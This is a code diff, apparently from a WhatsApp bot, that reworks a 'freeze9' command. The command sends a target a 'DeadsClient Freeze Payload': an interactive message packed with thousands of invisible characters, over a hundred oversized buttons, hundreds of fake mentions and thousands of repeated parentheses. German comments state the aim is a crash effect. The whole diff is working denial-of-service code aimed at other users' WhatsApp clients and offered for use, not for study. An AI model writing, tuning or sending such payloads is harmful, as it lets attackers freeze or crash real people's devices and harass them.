@@ -14765,72 +14765,77 @@ case "freeze9": {
     const target = msg.key.remoteJid;
 
     try {
-        const ButtonsQPay = [
-            {
-                name: "single_select",
-                buttonParamsJson: JSON.stringify({
-                    title: "\u200E".repeat(9000),
-                    sections: [{ title: "\u200E", rows: [] }]
-                })
-            }
-        ];
+        const ButtonsQPay = [];
 
-        for (let i = 0; i < 45; i++) {  // leicht reduziert für Stabilität
+        // Erster großer Button
+        ButtonsQPay.push({
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "\u200E".repeat(8000),
+                sections: [{ title: "\u200E", rows: [] }]
+            })
+        });
+
+        // Viele Buttons für den Crash-Effekt
+        for (let i = 0; i < 40; i++) {
             ButtonsQPay.push(
-                { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
+                { 
+                    name: "cta_call", 
+                    buttonParamsJson: JSON.stringify({ status: true }) 
+                },
                 { 
                     name: "cta_copy", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2800) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2500) }) 
                 },
                 { 
                     name: "quick_reply", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2800) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2500) }) 
                 }
             );
         }
 
-        const messageContent = generateWAMessageFromContent(
-            target,
-            {
-                viewOnceMessage: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {},
-                            deviceListMetadataVersion: 2
+        const messageContent = {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadata: {},
+                        deviceListMetadataVersion: 2
+                    },
+                    interactiveMessage: {
+                        header: {
+                            title: "☠️ DeadsClient Freeze 🔥",
+                            hasMediaAttachment: false
                         },
-                        interactiveMessage: {
-                            header: {
-                                title: " | ☠️DeadsClient 🔥",
-                                hasMediaAttachment: false
-                            },
-                            body: {
-                                text: "☠️DeadsClient 🔥 Freeze Payload"
-                            },
-                            contextInfo: {
-                                participant: target,
-                                mentionedJid: [
-                                    "0@s.whatsapp.net",
-                                    ...Array.from({ length: 700 }, () => 
-                                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                                    )
-                                ],
-                                forwardingScore: 999,
-                                isForwarded: true
-                            },
-                            nativeFlowMessage: {
-                                buttons: ButtonsQPay,
-                                messageParamsJson: "(".repeat(3500)
-                            }
+                        body: {
+                            text: "☠️DeadsClient 🔥 Freeze Payload"
+                        },
+                        footer: {
+                            text: "."
+                        },
+                        contextInfo: {
+                            participant: target,
+                            mentionedJid: [
+                                "0@s.whatsapp.net",
+                                ...Array.from({ length: 600 }, () => 
+                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                                )
+                            ],
+                            isForwarded: true,
+                            forwardingScore: 999
+                        },
+                        nativeFlowMessage: {
+                            buttons: ButtonsQPay,
+                            messageParamsJson: "(".repeat(3000)
                         }
                     }
                 }
-            },
-            { 
-                timestamp: new Date()   // ← WICHTIG: new Date() statt Date.now()
             }
-        );
+        };
 
-        await sock.sendMessage(target, messageContent);
+        await sock.sendMessage(target, messageContent, { 
+            timestamp: new Date() 
+        });
+
         console.log(`✅ Freeze9 gesendet an ${target}`);
 
     } catch (e) {
